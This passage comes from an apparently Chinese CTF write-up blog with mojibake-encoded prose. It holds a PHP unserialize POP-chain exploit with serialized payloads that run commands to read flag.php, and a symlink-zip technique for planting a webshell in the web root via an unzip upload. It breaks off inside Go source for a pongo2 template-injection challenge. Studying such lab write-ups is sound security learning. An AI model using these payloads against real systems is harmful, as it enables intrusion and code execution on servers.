class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$man</span>=<span class="string">&quot;/var/lib/php/session/sess_84k8e3r5jr78om8diig6uia9br&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$woman</span>=<span class="string">&#x27;bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;mylove;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c=&amp;<span class="variable">$a</span>-&gt;b;</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="string">&quot;lalala&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b=<span class="keyword">new</span> <span class="title function_ invoke__">end</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b-&gt;func=<span class="string">&quot;session_start&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><br>æ–‡ä»¶å†™å…¥<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">love</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable language_">$this</span>-&gt;c-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xk</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$man</span>=<span class="string">&quot;/var/lib/php/session/sess_84k8e3r5jr78om8diig6uia9br&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$woman</span>=<span class="string">&#x27;bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;mylove;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">end</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">love</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;c=&amp;<span class="variable">$a</span>-&gt;b;</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="string">&quot;lalala&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;b=<span class="keyword">new</span> <span class="title function_ invoke__">xk</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><br>ä¹‹åå°±æ˜¯æŒ‰ä¹‹å‰çš„æ€è·¯æ¥æ‰“äº†ã€‚<br>æ–‡ä»¶å†™å…¥çš„å†…å®¹å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name|s:14:&quot;your are good!&quot;;base64ç¼–ç åå°±æ˜¯bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7</span><br></pre></td></tr></table></figure></p><p>payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;lalala&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;end&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;session_start&quot;</span>;&#125;&#125;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;R:<span class="number">6</span>;&#125;</span><br><span class="line"></span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;lalala&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">2</span>:<span class="string">&quot;xk&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;man&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;/var/lib/php/session/sess_84k8e3r5jr78om8diig6uia9br&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;woman&quot;</span>;s:<span class="number">36</span>:<span class="string">&quot;bmFtZXxzOjE0OiJ5b3VyIGFyZSBnb29kISI7&quot;</span>;&#125;&#125;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;R:<span class="number">7</span>;&#125;</span><br><span class="line"></span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;lalala&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;end&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;session_start&quot;</span>;&#125;&#125;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;N;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;R:<span class="number">6</span>;&#125;&amp;test=_SESSION&amp;shell=tac%<span class="number">20</span>flag.php</span><br></pre></td></tr></table></figure></p><h1 id="åº”æ€¥å“åº”-1"><a href="#åº”æ€¥å“åº”-1" class="headerlink" title="åº”æ€¥å“åº”-1"></a>åº”æ€¥å“åº”-1</h1><img src="/2024/04/21/%E5%B8%95%E9%B2%81%E6%9D%AF/2.png" class="" title="alt text"><p>åœ¨æ ‡ç­¾åˆ—è¡¨é‡Œæœ‰flag</p><h1 id="åº”æ€¥å“åº”-3"><a href="#åº”æ€¥å“åº”-3" class="headerlink" title="åº”æ€¥å“åº”-3"></a>åº”æ€¥å“åº”-3</h1><img src="/2024/04/21/%E5%B8%95%E9%B2%81%E6%9D%AF/3.png" class=""><p>æœåŠ¡å™¨çš„å‘½ä»¤è®°å½•å…¨æ˜¯è¿™ä¸ªip</p><h1 id="åº”æ€¥å“åº”-4"><a href="#åº”æ€¥å“åº”-4" class="headerlink" title="åº”æ€¥å“åº”-4"></a>åº”æ€¥å“åº”-4</h1><p>æˆ‘ä»¬çœ‹wafçš„æ‹¦æˆªè®°å½•å¯ä»¥æ˜æ˜¾å‘ç°è¿™æ˜¯ä¸€ä¸ªrceæ¼æ´<br>åœ¨ç½‘ä¸Šæœjumpserver rceæ¼æ´å°±å¯ä»¥æ‰¾åˆ°è¿™ä¸ªcve<br><img src="/2024/04/21/%E5%B8%95%E9%B2%81%E6%9D%AF/4.png" class="" title="alt text"></p><h1 id="Misc-ç­¾åˆ°"><a href="#Misc-ç­¾åˆ°" class="headerlink" title="Misc-ç­¾åˆ°"></a>Misc-ç­¾åˆ°</h1><p>é¢˜ç›®æœ‰æç¤ºï¼Œæ˜¯asciiç å€¼<br>æˆ‘ä»¬å°†ç»™çš„æ•°å­—è½¬ä¸º16è¿›åˆ¶åœ¨ç”¨ç½‘ä¸Šç°æˆçš„å·¥å…·å³å¯å¾—åˆ°ä¸‹é¢çš„ç»“æœ<br><img src="/2024/04/21/%E5%B8%95%E9%B2%81%E6%9D%AF/5.png" class="" title="alt text"></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSåˆ·é¢˜</title>
      <link href="/2024/04/16/NSS%E5%88%B7%E9%A2%98/"/>
      <url>/2024/04/16/NSS%E5%88%B7%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="å› ä¸ºXYæ•´ä½“æŒç»­æ—¶é—´å¤ªé•¿äº†ï¼Œè€Œä¸”åé¢å‡ºçš„é¢˜ç›®ä¹Ÿè¶Šæ¥è¶Šä¸åšäººã€‚äºæ˜¯æˆ‘å°±æƒ³ç€è¿˜æ˜¯åˆ·åˆ·NSSå­¦ä¹ å­¦ä¹ å§ã€‚"><a href="#å› ä¸ºXYæ•´ä½“æŒç»­æ—¶é—´å¤ªé•¿äº†ï¼Œè€Œä¸”åé¢å‡ºçš„é¢˜ç›®ä¹Ÿè¶Šæ¥è¶Šä¸åšäººã€‚äºæ˜¯æˆ‘å°±æƒ³ç€è¿˜æ˜¯åˆ·åˆ·NSSå­¦ä¹ å­¦ä¹ å§ã€‚" class="headerlink" title="å› ä¸ºXYæ•´ä½“æŒç»­æ—¶é—´å¤ªé•¿äº†ï¼Œè€Œä¸”åé¢å‡ºçš„é¢˜ç›®ä¹Ÿè¶Šæ¥è¶Šä¸åšäººã€‚äºæ˜¯æˆ‘å°±æƒ³ç€è¿˜æ˜¯åˆ·åˆ·NSSå­¦ä¹ å­¦ä¹ å§ã€‚"></a>å› ä¸ºXYæ•´ä½“æŒç»­æ—¶é—´å¤ªé•¿äº†ï¼Œè€Œä¸”åé¢å‡ºçš„é¢˜ç›®ä¹Ÿè¶Šæ¥è¶Šä¸åšäººã€‚äºæ˜¯æˆ‘å°±æƒ³ç€è¿˜æ˜¯åˆ·åˆ·NSSå­¦ä¹ å­¦ä¹ å§ã€‚</h1><h1 id="Unzip-ciscn"><a href="#Unzip-ciscn" class="headerlink" title="Unzip(ciscn)"></a>Unzip(ciscn)</h1><p>è¿™é“é¢˜ç›®çš„ä¸»è¦å­¦åˆ°çš„æ˜¯å…³äºè½¯è¿æ¥çš„çŸ¥è¯†ã€‚<br>æˆ‘å…ˆè´´å‡ ç¯‡æ–‡ç« <br><a href="https://www.cnblogs.com/crazylqy/p/5821105.html">https://www.cnblogs.com/crazylqy/p/5821105.html</a><br><a href="https://www.cnblogs.com/sueyyyy/p/10985443.html">https://www.cnblogs.com/sueyyyy/p/10985443.html</a><br>è¿™ç¯‡æ–‡ç« è®²çš„æ˜¯è½¯é“¾æ¥</p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="è½¯è¿æ¥çš„æ¦‚å¿µ"><a href="#è½¯è¿æ¥çš„æ¦‚å¿µ" class="headerlink" title="è½¯è¿æ¥çš„æ¦‚å¿µ"></a>è½¯è¿æ¥çš„æ¦‚å¿µ</h3><p>è½¯é“¾æ¥å…¶å®å°±æ˜¯ç›¸å½“äºwindowsçš„å¿«æ·æ–¹å¼<br>è€Œå¿«æ·æ–¹å¼å…¶å®å°±æ˜¯ä¸€ä¸ªæŒ‡å‘å¯¹åº”è·¯å¾„æˆ–æ–‡ä»¶çš„ä¸€ç§æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´å³ä½¿å¿«æ·æ–¹å¼åœ¨ä¸åŒçš„ç”µè„‘ä¸Šåªè¦è·¯å¾„å­˜åœ¨å…¶å°±ä¼šæŒ‡å‘é‚£ä¸ªè·¯å¾„ï¼Œè½¯é“¾æ¥åŒç†</p><h3 id="è½¯é“¾æ¥åˆ›é€ æŒ‡ä»¤"><a href="#è½¯é“¾æ¥åˆ›é€ æŒ‡ä»¤" class="headerlink" title="è½¯é“¾æ¥åˆ›é€ æŒ‡ä»¤"></a>è½¯é“¾æ¥åˆ›é€ æŒ‡ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è½¯é“¾æ¥</span><br><span class="line">ln -s source target</span><br><span class="line">ç¡¬é“¾æ¥</span><br><span class="line">ln source target</span><br></pre></td></tr></table></figure><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><p>çœ‹é“è¿™é¢˜æ˜¯æ–‡ä»¶ä¸Šä¼ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å¾ˆè‡ªç„¶çš„æƒ³åˆ°ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ã€‚ä½†æ˜¯æˆ‘ä»¬é€šè¿‡æ‰«åå°çœ‹åˆ°çš„æºç ï¼Œå¯ä»¥çœ‹åˆ°å…¶æ–‡ä»¶ä¸Šä¼ çš„ä½ç½®åœ¨/tmpç›®å½•ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]) === <span class="string">&#x27;application/zip&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;cd /tmp &amp;&amp; unzip -o &#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//only this!</span></span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶åœ¨/tmpç›®å½•åœ¨è§£å‹äº†æˆ‘ä»¬ä¸Šä¼ çš„å‹ç¼©åŒ…ã€‚å¹¶ä¸”å…¶å¯ä»¥è¿›è¡Œæ–‡ä»¶è¦†ç›–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•ä½¿ç”¨è½¯é“¾æ¥<br>æˆ‘ä»¬å…ˆåˆ›é€ ä¸€ä¸ªæŒ‡å‘/var/www/htmlæ–‡ä»¶å¤¹çš„è½¯é“¾æ¥ã€‚<br><br>å†é€šè¿‡ä¸‹é¢çš„æŒ‡ä»¤å°†è½¯é“¾æ¥è¿›è¡Œå‹ç¼©<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip --symlinks test.zip ./test</span><br></pre></td></tr></table></figure><br>ç„¶åä¸Šä¼ æˆ‘ä»¬çš„è½¯é“¾æ¥å‹ç¼©åŒ…ã€‚<br>è¿™æ—¶å€™/tmpä¸‹å°±ä¼šå­˜å†ä¸€ä¸ªæŒ‡å‘webç›®å½•çš„ä¸€ä¸ªè½¯é“¾æ¥ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬è¦æ€ä¹ˆä¼ é©¬å‘¢?<br>å¾ˆç®€å•æˆ‘ä»¬åªè¦ä¸Šä¼ ä¸€ä¸ªå’Œè½¯é“¾æ¥æ–‡ä»¶å¤¹åŒåçš„æ–‡ä»¶å¤¹å³å¯ã€‚å½“è¿›è¡Œæ–‡ä»¶è¦†ç›–æ—¶ä¼šé€šè¿‡è½¯é“¾æ¥å°†æ–‡ä»¶å¤¹å†…çš„æ–‡ä»¶è¦†ç›–åˆ°è½¯é“¾æ¥æ‰€æŒ‡å‘çš„æ–‡ä»¶å¤¹ã€‚<br>é‚£ä¹ˆæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªtestæ–‡ä»¶å¤¹åœ¨æ–‡ä»¶å¤¹ä¸‹å†™å…¥ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ã€‚å‹ç¼©åä¸Šä¼ è¿™æ ·shellæ–‡ä»¶å°±ä¸Šä¼ åˆ°äº†webé¡µé¢ä¸‹ã€‚<br></p><h2 id="è½¯é“¾æ¥çš„å…¶ä»–å°æŠ€å·§"><a href="#è½¯é“¾æ¥çš„å…¶ä»–å°æŠ€å·§" class="headerlink" title="è½¯é“¾æ¥çš„å…¶ä»–å°æŠ€å·§"></a>è½¯é“¾æ¥çš„å…¶ä»–å°æŠ€å·§</h2><p>å¦‚æœä¸€ä¸ªç½‘é¡µå¯ä»¥å°†ä¸Šä¼ çš„æ–‡ä»¶çš„å†…å®¹è¿›è¡Œè¾“å‡ºï¼Œé‚£ä¹ˆè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨è½¯é“¾æ¥å°è¯•æŒ‡å‘ä¸€äº›å‘½ä»¤å’Œæ–‡ä»¶å°è¯•è¿›è¡Œå‘½ä»¤ç©¿è¶Šã€‚</p><h1 id="CISCN-2023-åˆèµ›-go-session"><a href="#CISCN-2023-åˆèµ›-go-session" class="headerlink" title="[CISCN 2023 åˆèµ›]go_session"></a>[CISCN 2023 åˆèµ›]go_session</h1><p>å“ˆå“ˆè¿™ç¯‡æ–‡ç« å¯æ˜¯è®©æˆ‘ç‹ ç‹ çš„å­¦ä¹ äº†ä¸€ä¸‹goè¯­è¨€çš„sstiã€‚<br>æˆ‘ä»¬å…ˆå¯¹æºç è¿›è¡Œå®¡è®¡<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;html&quot;</span></span><br><span class="line">    <span class="string">&quot;io&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span 